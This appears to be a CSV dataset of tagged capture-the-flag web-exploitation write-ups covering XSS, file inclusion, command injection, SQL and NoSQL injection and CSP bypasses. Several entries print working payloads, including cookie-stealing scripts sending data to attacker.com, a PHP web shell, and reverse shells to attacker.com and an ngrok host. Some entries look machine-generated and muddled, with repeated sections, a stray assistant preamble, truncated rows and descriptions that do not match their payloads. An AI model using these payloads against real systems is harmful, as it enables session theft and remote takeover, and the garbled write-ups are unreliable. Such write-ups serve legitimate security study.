"filename","category","text"
"writeup_0022_tagged.txt","Web Exploitation","Title: Cross-Site Scripting (XSS) Attack on a Web Application
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: session cookie, input validation, output encoding, Content Security Policy (CSP)

#context
During a CTF competition, I encountered a web application that included a search feature allowing users to search for content on the website. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject malicious code into a web page and manipulate user data.

#discovery
To test for XSS, I entered a malicious payload containing JavaScript code into the search box, such as <script>alert('XSS');</script>, which would cause the application to execute the JavaScript code and display an alert box containing the text 'XSS'. Upon submitting the payload, the application executed the JavaScript code, confirming the presence of an XSS vulnerability.

#exploitation
To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the session cookie of a logged-in user. After researching the application's system and network configuration, I crafted a suitable payload containing JavaScript code that would steal the session cookie of a logged-in user and send it to an attacker-controlled server, such as <script>new Image().src='http://attacker.com/cookie.php?cookie='+document.cookie;</script>. This payload allowed me to obtain the session cookie of a logged-in user, which I could then use to impersonate the user and complete the Web Exploitation challenge.

#code
<script>alert('XSS');</script>
<script>new Image().src='http://attacker.com/cookie.php?cookie='+document.cookie;</script>

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against Cross-Site Scripting vulnerabilities by implementing proper input validation and output encoding controls, using Content Security Policy (CSP), and validating user input. By exploiting the vulnerability, I was able to steal the session cookie of a logged-in user, complete the Web Exploitation challenge, and demonstrate the potential risks associated with XSS.
"
"writeup_0023_tagged.txt","Web Exploitation","Title: File Inclusion Vulnerability Exploitation
Primary topic: Web Exploitation
Secondary topic: File Inclusion
Tools used: None
Keywords: path traversal, payload, PHP code, input validation, output encoding, whitelisting, user input

#context
During a CTF competition, I encountered a web application that included a file inclusion feature allowing users to include external files into the application. Given the potential security risks associated with including user-provided files, I suspected that the application might be vulnerable to File Inclusion vulnerability, a type of vulnerability that allows attackers to include malicious files and execute arbitrary code.

#discovery
To test for File Inclusion, I entered a malicious payload containing a path traversal sequence into the file inclusion parameter, such as ../../../../etc/passwd, which would cause the application to include the '/etc/passwd' file on the server.

#exploitation
Upon submitting the payload, the application included the '/etc/passwd' file, confirming the presence of a File Inclusion vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the File Inclusion vulnerability to execute arbitrary code on the server. After researching the application's system and network configuration, I crafted a suitable payload containing PHP code that would execute arbitrary code on the server and send the output to an attacker-controlled server, such as <?php system($_GET['cmd']); ?>. This payload allowed me to execute arbitrary code on the server and obtain sensitive information, such as the contents of system files or database credentials.

#code
<?php system($_GET['cmd']); ?>

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against File Inclusion vulnerabilities by implementing proper input validation and output encoding controls, using whitelisting techniques, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the server, obtain sensitive information, complete the Web Exploitation challenge, and demonstrate the potential risks associated with File Inclusion.
"
"writeup_0024_tagged.txt","Web Exploitation","Title: Remote Code Execution (RCE) Vulnerability Exploitation
Primary topic: Web Exploitation
Secondary topic: Remote Code Execution (RCE)
Tools used: None
Keywords: system commands, payload, reverse shell

#context
During a CTF competition, I encountered a web application that included a user input feature allowing users to execute system commands on the server. Given the potential security risks associated with allowing users to execute system commands, I suspected that the application might be vulnerable to Remote Code Execution (RCE), a type of vulnerability that allows attackers to execute arbitrary code on the server.

#discovery
To test for RCE, I entered a malicious payload containing system commands into the user input parameter, such as ; ls -al, which would cause the application to execute the 'ls -al' command on the server.

#exploitation
Upon submitting the payload, the application executed the 'ls -al' command, confirming the presence of an RCE vulnerability. After researching the application's system and network configuration, I crafted a suitable payload containing a reverse shell command that would open a shell on the attacker-controlled server, such as ; bash -i >& /dev/tcp/attacker.com/1234 0>&1. This payload allowed me to execute arbitrary code on the server, obtain sensitive information, and establish a persistent backdoor to the server.

#code
`; ls -al`
`; bash -i >& /dev/tcp/attacker.com/1234 0>&1`

#discovery
To obtain the flag for the Web Exploitation challenge, I needed to use the RCE vulnerability to execute arbitrary code on the server and obtain sensitive information.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against Remote Code Execution vulnerabilities by implementing proper input validation and output encoding controls, using whitelisting techniques, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the server, obtain sensitive information, complete the Web Exploitation challenge, and demonstrate the potential risks associated with RCE.
"
"writeup_0025_tagged.txt","Web Exploitation","Title: Cross-Site Scripting (XSS) Vulnerability Exploitation
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: session cookie, input validation, output encoding, content security policies

#context
During a CTF competition, I encountered a web application that included a search feature allowing users to search for specific products. Given the potential security risks associated with cross-site scripting (XSS) vulnerabilities, I suspected that the application might be vulnerable to XSS attacks.

#discovery
To test for XSS, I entered a malicious payload containing a JavaScript script into the search parameter, such as <script>alert('XSS');</script>, which would cause the application to execute the JavaScript script on the client-side.

#exploitation
Upon submitting the payload, the application executed the JavaScript script, confirming the presence of an XSS vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the user's session cookie and impersonate the user.

#code
<script>new Image().src=""http://attacker.com/steal.php?cookie=""+document.cookie;</script>

#discovery
After researching the application's system and network configuration, I crafted a suitable payload containing a script that would steal the user's session cookie and send it to an attacker-controlled server, such as <script>new Image().src=""http://attacker.com/steal.php?cookie=""+document.cookie;</script>. This payload allowed me to steal the user's session cookie, impersonate the user, and gain access to the application's sensitive information.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by implementing proper input validation and output encoding controls, using content security policies, and validating user input. By exploiting the vulnerability, I was able to steal the user's session cookie, impersonate the user, complete the Web Exploitation challenge, and demonstrate the potential risks associated with XSS.
"
"writeup_0026_tagged.txt","Web Exploitation","Title: File Inclusion Vulnerability Exploitation
Primary topic: Web Exploitation
Secondary topic: File Inclusion
Tools used: None
Keywords: path traversal, arbitrary code execution, input validation, output encoding, whitelisting

#context
During a CTF competition, I encountered a web application that included a file inclusion feature allowing users to include files on the server. Given the potential security risks associated with file inclusion vulnerabilities, I suspected that the application might be vulnerable to file inclusion attacks.

#discovery
To test for file inclusion, I entered a malicious payload containing a path traversal attack into the file inclusion parameter, such as ../../../../../../etc/passwd, which would cause the application to include the '/etc/passwd' file on the server.

#exploitation
Upon submitting the payload, the application included the '/etc/passwd' file, confirming the presence of a file inclusion vulnerability. After researching the application's system and network configuration, I crafted a suitable payload containing a script that would execute arbitrary code on the server and send the output to an attacker-controlled server, such as php://filter/convert.base64-encode/resource=index.php. This payload allowed me to execute arbitrary code on the server, obtain sensitive information, and establish a persistent backdoor to the server.

#code
None

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against file inclusion vulnerabilities by implementing proper input validation and output encoding controls, using whitelisting techniques, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the server, obtain sensitive information, complete the Web Exploitation challenge, and demonstrate the potential risks associated with file inclusion.
"
"writeup_0027_tagged.txt","Web Exploitation","Title: SQL Injection in User Login
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: credentials, authentication, database

#context
During a CTF competition, I encountered a web application that included a user login feature allowing users to login using their credentials. Given the potential security risks associated with SQL injection vulnerabilities, I suspected that the application might be vulnerable to SQL injection attacks.

#discovery
To test for SQL injection, I entered a malicious payload containing a SQL injection attack into the login parameter, such as admin' --, which would cause the application to execute a valid SQL query and bypass the authentication mechanism.

#exploitation
Upon submitting the payload, the application logged me in as an administrator, confirming the presence of an SQL injection vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL injection vulnerability to extract sensitive information from the database.

#code
admin' UNION SELECT 1,2,3,4,5,6,7 FROM sensitive_table WHERE '1'='1.

#discovery
After researching the application's database schema and structure, I crafted a suitable payload containing a script that would extract sensitive information from the database, such as admin' UNION SELECT 1,2,3,4,5,6,7 FROM sensitive_table WHERE '1'='1. This payload allowed me to extract sensitive information from the database, such as the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against SQL injection vulnerabilities by implementing proper input validation and output encoding controls, using parameterized queries, and validating user input. By exploiting the vulnerability, I was able to extract sensitive information from the database, complete the Web Exploitation challenge, and demonstrate the potential risks associated with SQL injection.
"
"writeup_0001_tagged.txt","Web Exploitation","Title: Cookie Manipulation for Privilege Escalation
Topics: Web Exploitation
Vulnerabilities: Cookie Manipulation, Privilege Escalation
Tools used: Browser Developer Tools
Keywords: user_role, admin access, sensitive information

#context
During a recent CTF competition, I encountered a web application that allowed users to log in and view their account information. 

#discovery
After registering a regular user account, I started to analyze the cookies being set by the application. Upon logging in, I noticed a cookie named user_role with a value of user. This immediately caught my attention, as the cookie's name suggested that it might be related to user privileges.

#exploitation
I decided to manipulate the cookie value to see if I could escalate my privileges within the application. Using browser developer tools, I modified the user_role cookie value to admin and refreshed the page. Surprisingly, the application didn't seem to have any server-side validation of the cookie value, and I was granted admin access. With admin access, I was able to view sensitive information that was restricted to regular users. This allowed me to complete the Web Exploitation challenge by finding the flag hidden in the restricted admin area.

#countermeasures
In conclusion, this CTF writeup demonstrates the importance of server-side validation for cookies and user input. By simply manipulating a cookie value, I was able to escalate my privileges and gain unauthorized access to sensitive information. To prevent this type of attack, web developers should implement server-side validation of cookies and user input to ensure that only authorized users can access sensitive information."
"writeup_0002_tagged.txt","Web Exploitation","Title: Bypassing Client-Side Validation via JavaScript Console
Topics: Web Exploitation
Vulnerabilities: None
Tools used: None
Keywords: JavaScript Console, client-side validation, server-side validation

#context
In a recent CTF challenge, I stumbled upon a web application with a form that required user input. The form asked for an invite code, and it seemed that only users with a valid invite code could access the restricted area of the website.

#discovery
Upon inspecting the source code, I discovered that the form validation was being performed only on the client-side using JavaScript. This immediately caught my attention, as client-side validation can be easily bypassed.

#exploitation
I decided to use the browser's JavaScript console to manipulate the validation function directly. By doing so, I was able to bypass the client-side validation and submit the form without needing a valid invite code.

#context
To my surprise, after bypassing the validation, I was granted access to the restricted area of the website. Inside, I found the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of implementing proper server-side validation alongside client-side validation. Relying solely on client-side validation can lead to security vulnerabilities, as attackers can easily manipulate and bypass the validation checks."
"01_basic_injection_tagged.txt","Web Exploitation","Title: Basic Injection
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: SQLi, input sanitization

#context
Just like the title said, the task involves SQL injection (SQLi), which I really have not yet studied. Let's begin.

#discovery
I have a little experience and understanding of SQL so my study was not long, the point is to make the request valid, for example 1=1 is always true, so the server will return all of the items. This challenge is really friendly and shows what is the resulting query, which helps a lot.

#exploitation
We need to make the query valid, but not really a big riddle, my resulting input is '' or 'a'='a and the missing ' will be added by the server. The payload going to pull all the data from the database. This is because the input field is not sanitized which makes the searching field vulnerable to the SQL injection. A hacker can pull all the information from a database that included sensitive data.
"
"02_post_practice_tagged.txt","Web Exploitation","Title: Post Practice
Primary topic: Web Exploitation
Secondary topic: HTTP Request Manipulation
Tools used: Burp Suite, curl
Keywords: POST request, HTTP-request header, username, password

#context
This is actually a very easy challenge if you know about HTTP, I don't know why the author gave it a Medium difficulty. Let's begin. From the description alone we understand what is the challenge about. Make a POST request, and pass login information, the question is how it should look like and what information we need to pass. In the page we don't see much, checking the source will give us the credentials for the login. Nicely commented us `username: admin | password: 71urlkufpsdnlkadsf` so now we know what are the parameters we need to send, and what are their values. 

#discovery
For this task, you are required to play around with the HTTP-request header. By using Burp Suite, the request is originally a GET. Our objective is to change the request from GET to POST. If you look at the response, you should find the username and password for the POST request. As I said the challenge is very easy, it's not even a hard thing to learn how POST request works and what is it. 
"
"03_dont_bump_your_header_tagged.txt","Web Exploitation","Title: Don't Bump Your Head(er)
Primary topic: Web Exploitation
Secondary topic: HTTP Header Manipulation
Tools used: Postman
Keywords: User-Agent, Referer

#context
When you visit the site, you can find the clue in the HTML code: ""Sorry, it seems as if your user agent is not correct, in order to access this website.""

#discovery
From the clue above, we have to change the User-Agent to Sup3rS3cr3tAg3nt before we send the request to the site. Using Postman, change the user agent and send GET request to /header.php. You will get this response: ""Sorry, it seems as if you did not just come from the site, 'awesomesauce.com'.""

#exploitation
You have to change the Referer in the header to awesomesauce.com then you send GET request again to /header.php. The response contains the flag in it.
"
"04_my_blog_tagged.txt","Web Exploitation","Title: My Blog
Primary topic: Web Development
Secondary topic: None
Tools used: Firefox Developer Tools
Keywords: storage

#context
This is a kind of very unique challenge. No vulnerability, no bug, just a clean blog site. Instead of a complete CTF challenge, this is a test of web development knowledge.

#discovery
If you read the text carefully, ""you may find a good application for your memory."" That is a hint for the challenge. When the dev talked about memory, it must be something to do with the storage.

#exploitation
Question is, how do we access the storage? It is simple, for Firefox browser, open the Developer Tools and go to storage.

#discovery
I find the flag in the storage.
"
"05_inj3ction_time_tagged.txt","Web Exploitation","Title: Inj3ction Time
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: SQLMap
Keywords: quotes, UNION attack

#context
This challenge is a website with a single input where we can search for an id.

#discovery
I'll check if the input is vulnerable. From the description you'll notice that there's SQLi. To check if the ID field is vulnerable to SQLi, the first payload I used was a simple 1', which returned no results. Then I tried 1 OR 1=1. It worked but did not give me anything interesting, so the flag must be somewhere else in the database. I started suspecting that the quotes character is blacklisted.

#discovery
Finding how many columns the query needs. Next, I started to look for how many columns the query needs to work. This information will be needed in a UNION attack.

#exploitation
So at this point, I just use SQLMap to enumerate the db. 

#countermeasures
We must first extract the names of the existing databases. The next step is to extract the database information (table, columns, flag).
"
"06_gobustme_tagged.txt","Web Exploitation","Title: Gobustme
Primary topic: Web Exploitation
Secondary topic: Directory Bruteforcing
Tools used: DirBuster
Keywords: wordlist

#context
The main idea is to bruteforce directories and files hidden in a website. We go to the URL and notice the Ghostbuster theme song, except ""Ghostbusters"" is replaced with ""Gobuster"". The site links Gobuster which explains what kind of software it is.

#discovery
This is a personal preference but DirBuster is a GUI while Gobuster is a CLI which makes DirBuster slightly more beginner friendly. At the bottom of the website, common.txt is provided. This is a wordlist for possible lists to brute force. Set up DirBuster by configuring it to go to the website and use common.txt as the wordlist. If your computer can handle it, check off ""Go Faster"". After running for a bit, DirBuster will give all the results.

#exploitation
Upon visiting /hide we see the message ""It was well hidden isn't it?"" and we get the flag.
"
"07_calculat3_m3_tagged.txt","Web Exploitation","Title: Calculat3 M3
Primary topic: Command Injection
Secondary topic: Web Exploitation
Tools used: Burp Suite
Keywords: calculator

#context
A simple command injection challenge will be demonstrated in this walkthrough. The site gives a calculator that you can click the buttons to input expression, then it will eval the expression and gives a result.

#discovery
I provided random input in this calculator and intercepted the request with BurpSuite. I got one parameter taking the values: expression: 5 * 6 

#exploitation
Try to get the contents in directory, set the expression to ;ls. Submit it to get a list of file names in result, the flag is the one starts with ctf.

#code
;ls

#countermeasures
This challenge demonstrates the importance of properly validating user input and preventing command injection attacks. It also highlights the need for secure coding practices and regular security testing to identify and address vulnerabilities in web applications.
"
"08_audioedit_tagged.txt","Web Exploitation","Title: AudioEdit
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: easyTAG
Keywords: mp3 metadata

#context
The challenge description said ""I made this cool site for editing audio files. Can you exploit it?"". After visiting the site, I got a simple page with written ""AudioEdit"" with the chance of upload a .mp3 audio file.

#discovery
The provided file will be uploaded and the discovered insertion statement in the db looks like this: `INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'author','title'...);`.

#exploitation
In order to do an SQL-injection we have to create a special author and title field. I used easyTAG but of course you can use the tool of your choice to modify mp3 metadata. In order to inject and maintain a valid INSERT statement you can create a mp3 with the following metadata: `title  = """" (not important) author = a', (SELECT @@version))-- -b`, which creates the following statement. This gave us the database version.

#discovery
Next we wanted to know the tables name. And of course the columns names.

#exploitation
Finally we get the flag.

#code
```
INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'a', (SELECT @@version))-- -b',''...);
```
"
"09_grid_it_tagged.txt","Web Exploitation","Title: Grid It!
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: PHP serialized object, PHP Object Injection, Blind SQL Injection, ASCII codes, binary search, MD5 hash

#context
We are given a register/login panel on a webpage. After logging in, we see a 2D plane where we can add or remove points. Requests go through ""controller.php?action="", with various actions available.

#discovery
We notice a PHP serialized object when deleting points. We try SQL Injection by modifying the object and all points disappear. We observe that the delete() function is invoked on the point object, hinting at PHP Object Injection. However, the classes containing the ::delete() method (Phar and PharData) seem useless for this task.

#exploitation
We return to SQL Injection, aiming for Blind SQL Injection since there's no output. Our goal is to fetch table and column names inside the database. We create queries with conditions based on the comparison of ASCII codes of characters in the desired data. We perform a binary search to find the correct characters and retrieve the entire name. We find two tables and six columns. We fetch the admin's password with a similar query and obtain an MD5 hash.

#countermeasures
After cracking the MD5 hash, we get the password: grapevine. Logging in as admin, we receive the flag: ctflearn{obj3ct_inj3ct1on}. The name is misleading as it wasn't an object injection, just object modification.
"
"10_prehashbrown_tagged.txt","Web Exploitation","Title: Prehashbrown
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: Burp Suite, SQLMap
Keywords: None

#context
In the site we have a search bar that is SQL Injection vulnerable.

#discovery
So, using Burpsuite, I capture the request header and saved as header.txt.

#discovery
I started to enumerate the database using SQLMap.
So, I tried to enumerate a certain table.

#exploitation
The flag is within the table and I dumped all information from the table.
Finally I get the flag!
"
"Crocodilu_tagged.txt","Web Exploitation","Title: Crocodilu
Topics: Web Exploitation, Information Gathering, HTML Injection, Bypassing Security
Vulnerabilities: Rate Limiting Bypass, HTML Sanitization Bypass, JSONP Endpoint Abuse
Tools used: Python Script, Burp Suite, Google's CSP evaluator
Keywords: OTP, Redis, BeautifulSoup, Content Security Policy, JSONP, exfiltration

#context
Description
Check out my new video sharing platform!
Gaining Access
The first thing we needed to do was to gain access to the application. We can register a new user, but attempting to log in as that user would result in a ""User not active"" error.

#discovery
Taking a look at `auth.py`, we would see that a successful password reset at `/reset_password` would set `user.active` to `True, allowing us to access the app.
To do so, we first have to request an OTP at `/request_code`. This sets `user.code` to a random 4-digit number.

#exploitation
If no rate limiting is enforced on `/reset_password`, a 4-digit OTP would be trivial to brute-force. However, in this case, rate limiting is enforced on a per-email basis through a Redis store.
When a guess at the OTP is made, the value for the corresponding email address is incremented by 1. After 3 attempts, any further attempts for the same email address are blocked.

#discovery
Interestingly, the SQL query that checks the OTP code uses the `LIKE` operator.
The final query is something like:
```
SELECT * FROM users WHERE email LIKE ""email"" AND code LIKE ""code""
```
which means that if we can insert the % wildcard at the start or end of either email or code, there's a good chance we can bypass the check in reasonable time.

#discovery
Unfortunately, `code` is checked using `code.isdigit()`. Let's see if we can get past `is_valid_email(email)` instead.
The regular expression does not allow for special characters like `%`. However, `re.match` only matches at the beginning of the string, so this still allows for wildcards at the end of the email.
""If zero or more characters at the beginning of string match the regular expression pattern, return a corresponding match object. Return `None` if the string does not match the pattern; note that this is different from a zero-length match.""
There are two possibilities here - the first one is to create many accounts sharing the same prefix in their emails, increasing the chance that any code would be valid for `some@email.prefix%`. Because the registration form is reCAPTCHA-protected, this is not possible.
The approach we take instead relies on the ability to add any number of % characters at the end of the email. Because `%` matches 0 or more characters, the query will yield the same result no matter how many `%` characters are added.
Using a Python script, we can brute force the entire OTP space within a few minutes.

#context
Bypassing HTML Sanitization
Now that we are in, where is the flag? When the container first starts up a post is made containing the flag. The post is admin-only, which means we need to stage a client-side attack against the admin.

#discovery
Our first hurdle is BeautifulSoup. Our HTML content is parsed and checked for any blacklisted tags. Combined with a restrictive CSP (Content Security Policy), this greatly restricts what we can do.

#exploitation
Luckily for us, the built-in `html.parser` does not treat malformed HTML the same way as a standards-compliant HTML5 parser would. There is a section dedicated to this in the BeautifulSoup version 4 documentation.
One trick to exploit this parser differential is through HTML comments. Consider the following payload:
```
<!--><script>alert(1)</script>-->
```
BeautifulSoup thinks that the comment spans the entire payload, ending at `-->`.
However, a HTML5 parser would accept `<!-->` as a valid comment. We can test this out on any modern browser using a DOM viewer.

#context
Abusing YouTube JSONP Endpoint
Now that we can inject arbitrary HTML, we have to get past the rather restrictive CSP that is applied on all pages through the Nginx proxy.

#discovery
Throwing this into Google's CSP evaluator shows us that `www.youtube.com` might host JSONP (JSON with Padding) endpoints that we can abuse.

#exploitation
If so, we could use something like:
```
<script src=""https://www.youtube.com/some_jsonp_endpoint?callback=alert""></script>
```
to achieve an XSS.

#discovery
But where? The evaluator is checking against a pre-defined list of known JSONP endpoints. The only one that matches `www.youtube.com` is:
```
""//www.youtube.com/profile_style""
```
which seems to be outdated because visiting that URL just brings us to a YouTube profile called ""Profile Style"".

#exploitation
At this point, I tried getting Burp Suite to insert a `callback=` parameter to all JSON endpoints requested using an extension like `jsonp` and using YouTube as a normal user, hoping to get lucky.
Alas, this did not yield any results. After sleeping off my frustration, I came back to this challenge when my teammate sent a link to an obscure issue on Google's issue tracker.
This didn't seem very helpful. After all, Google decided not to implement JSONP on the `/oembed` API, right? Using the `callback` parameter seems to have no effect.

#discovery
But when I randomly tried using `alert();` instead of `alert`, was returned a response.

#exploitation
Wait, did I just trigger a JSONP response? For some reason, using a ""valid"" callback name does not elicit a JSONP response, but an ""invalid"" one yields a JSONP response saying that the callback name is invalid. That's really weird and ironic.
With our `callback` parameter reflected into the response, we can now inject arbitrary JavaScript code. The only restrictions are that quotes and angle brackets are escaped.
To exfiltrate the contents of the admin's `/profile` page, we use a specific `callback` value.
Combined with the BeautifulSoup bypass above, we create the final payload we submit.
We can then find the URL of the post containing the flag, and repeat this one more time to fetch the URL post, we get the flag.
"
"secrets_tagged.txt","Web Exploitation","Title: secrets
Topics: Web Exploitation
Vulnerabilities: Cross-Site Scripting (XSS), CSP Violation, XS-Leak
Tools used: None
Keywords: SameSite, XS-Leak, URL length limit

#context
Overview
A secure and secret note storage system is a platform or application designed to keep your confidential notes safe from unauthorized access. The challenge revolved around searching contents of secret notes. 
The challenge revolved around searching contents of secret notes.

#discovery
Let's examine the behaviour of the search feature.
When searching for a note through `/search?query=<query>`, there are two possible responses:
1. The note was found.
In this case, a 301 redirect is issued to `http://results.wtl.pw/results?ids=<note UUIDs>&query=<query>`.
It is important to note that this is a redirect to a different subdomain. Searching on `secrets.wtl.pw` redirects to `results.wtl.pw`.
2. The note was not found.
In this case, a 301 redirect is issued to `http://secrets.wtl.pw/#<query>`.

#discovery
Unintended Solution - Chrome's 2MB URL Limit
One thing that might be immediately noticeable is that if the note was found, then the resulting URL length is extended considerably by the `ids` parameter.
A well-known technique in these kinds of scenarios is hitting the server's maximum URL limit, and detecting error status codes. However, these rely on `SameSite=None` cookies for the error event detection.
The challenge had `SameSite=Lax` cookies, so the primitive for any XS-Leak attack is a top-level navigation (e.g. through `window.open`). There is no way to detect server response codes in a cross-origin window reference, so I started looking for other ways to detect the URL inflation.
We might not be able to detect a server-side URL length error, but can we somehow detect a client-side one? According to Chromium documentation, Chrome's maximum URL length is 2MB:
""In general, the web platform does not have limits on the length of URLs (although 2^31 is a common limit). Chrome limits URLs to a maximum length of 2MB for practical reasons and to avoid causing denial-of-service problems in inter-process communication.""

#exploitation
This is where it gets interesting! Because this is a client-side constraint, and URL fragments persist on redirects, we can open `/search?query=<query>#AAA...[2MB]...AAA` to hit the length limit.
So, what happens when the URL limit is exceeded?
Apparently, it shows an `about:blank#blocked` page.
As you might expect, trying to access the `origin` (or any other sensitive information) of a cross-origin window reference would raise an exception.

#discovery
However, when opening a page that errors out due to the 2MB constraint, the window's `origin` remains that of the parent.

#exploitation
As an experiment, let's try a successful query.
The length of the opened URL is exactly 2MB - 1, so the initial search URL is just under the length limit.
When the window is redirected to:
```
http://results.wtl.pw/results?ids=<note UUIDs>&query=test#AAA...AAA
```
the URL is extended and the length limit is hit. The window becomes an `about:blank` page and its `origin` remains that of the parent.
Now, if we try the same thing on an unsuccessful query, the final redirected URL falls short of the 2MB limit and the window's `origin` is no longer accessible.

#discovery
This can be extended to the following PoC, which brute-forces a character of the flag.
Because this PoC only tells us what is definitely not the flag (by detecting the `w.origin` errors), we can implement a backend server to quickly find what is the flag by eliminating the unsuccessful queries from the charset.
The downside of this method is that the long URLs can cause significant lag on the server's admin bot. This may or may not have made the bot extremely unstable for a period of time... oops!

#exploitation
Intended Solution - CSP Violation
It turns out that there is a much faster and less laggy way of detecting the redirects. Because the redirect is to a different origin, we can use CSP violations as an oracle.
Because the query was successful, the window attempted to load `http://results.wtl.pw`. But since our CSP dictates that forms can only be submitted to `http://secrets.wtl.pw`, the request was blocked. We can detect this through the `securitypolicyviolation` event listener.
"
"02_friends_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: Dockerized Web Application Challenge
Primary topic: Web Exploitation
Secondary topic: JavaScript
Tools used: Docker, Prettier.io
Keywords: login, follow, unfollow, admin account, comma operator, __proto__

#context
"
"01_Pirate_birthday_planner_tagged.txt","Web Exploitation","Title: NoSQL Injection in Party App
Primary topic: Web Exploitation
Secondary topic: NoSQL Injection
Tools used: None
Keywords: cookie, session, Content-Type, application/json

#context
The portion of code to check if a user is authorized in the party is done in this middleware.

#discovery
The query is vulnerable to NoSQL injection, but we need to set both session.user and session.pin to a js object controlled by us. The session is stored in a cookie created with the cookie-session library, and it needs a signature with a random key, so we should find a way to get it from the server. When using the app in the intended way, the browser sends the requested data with Content-Type: application/x-www-form-urlencoded. However, the server also loads a middleware to interpret the application/json content type. Thanks to it, we can send data as JSON, injecting objects inside the input parameters of the server.

#exploitation
Our first try was the /new endpoint. Here we confirmed that it's possible to set as a pin an object like {""$ne"":""a""} and bypass the check. However, this endpoint calls the trim() function on the user parameter, making it unusable for the exploitation. We need to set both session.user and session.pin to an object to bypass the checks. We used two sessions in parallel to get the exploit working, a legit session and a session for the payload. First, we create a party in the legit session with valid values. Then, in the other session, we create a party sending the admin parameter equal to the object {""$ne"":""a""}. The creation of the party will fail, but the session values are updated anyway. In this way, we set session.user to the bypass object. However, we have a random value in session.pin, but we can't change it"
"01_Evaluation_Deck_tagged.txt","Web Exploitation","Title: Arbitrary Code Execution in Ghost Game
Primary topic: Web Exploitation
Secondary topic: Code Injection
Tools used: Burp Suite, ngrok
Keywords: Python, exec function, reverse shell

#context
Navigating to the challenge website, it presents the following page which list cards.

#discovery
On selecting a card, the HP of ghost increases of decrease depending on the points and operator. Intercepting the requests with burpsuite, when selecting a card, post request is sent to /api/get_health endpoint with three parameters as shown below.

#code
```
POST /api/get_health HTTP/1.1
Host: localhost:8080
Content-Length: 29
Content-Type: application/x-www-form-urlencoded
Connection: close

current_health=100&attack_power=100&operator=+
```

#context
In response, remaining health is sent. Looking into the source code, the three POST parameters are directly passed into the compile function which creates code format for exec function. The exec function in python allows to execute arbitrary python code. So, the lack of input validation means we can inject arbitrary code in this function and execute it.

#exploitation
Since, current_health and attack_power are passed into int function, injecting code into them will cause issue. But, the operator parameter is directly passed as string so we can use it. We can confirm this by commenting the attack_power parameter. Basically the following payload will look like this: `100 - 100# 34`. So, we can inject code before the comment.

#code
```
operator=.__class__.__base__.__subclasses__()[59]('/bin/bash', '-c', 'bash -i >& /dev/tcp/0.tcp.ngrok.io/12345 0>&1')
```

#discovery
Start the ngrok proxy which forward requests to local port 8080. Start listening on port 8080 to receive connection. Injection the following payload gives a reverse shell on the challenge container.

#countermeasures
The vulnerability in this challenge is caused by the lack of input validation and sanitization. To prevent arbitrary code execution vulnerabilities, it's essential to validate and sanitize all user input, especially when it's used to create dynamic code."
